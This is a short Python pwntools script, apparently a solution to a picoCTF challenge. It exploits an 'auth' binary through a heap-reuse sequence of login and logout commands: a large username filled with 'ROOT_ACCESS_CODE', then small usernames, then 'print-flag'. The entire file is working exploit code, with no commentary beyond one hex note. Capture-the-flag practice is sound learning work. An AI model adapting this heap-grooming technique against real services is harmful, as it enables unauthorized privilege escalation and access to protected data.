#!/usr/bin/python3

from pwn import *
import sys

BIN = './auth'

if len(sys.argv) > 1:
    r = remote('jupiter.challenges.picoctf.org', 31378)
else:
    r = process(BIN)

r.sendlineafter('Enter your command:', 'login')
r.sendlineafter('Please enter the length of your username\n', str(0x800))
r.sendlineafter('Please enter your username\n', 'A'*0x8 + 'ROOT_ACCESS_CODE'*0x80) # 0x10
input()
r.sendline()
r.sendlineafter('Enter your command:', 'logout')

r.sendlineafter('Enter your command:', 'login')
r.sendlineafter('Please enter the length of your username\n', str(0x10))
r.sendlineafter('Please enter your username\n', 'A'*0xf)

r.sendlineafter('Enter your command:', 'login')
r.sendlineafter('Please enter the length of your username\n', str(0x10))
r.sendlineafter('Please enter your username\n', 'B'*0xf)
r.sendlineafter('Enter your command:', 'print-flag')

r.interactive()
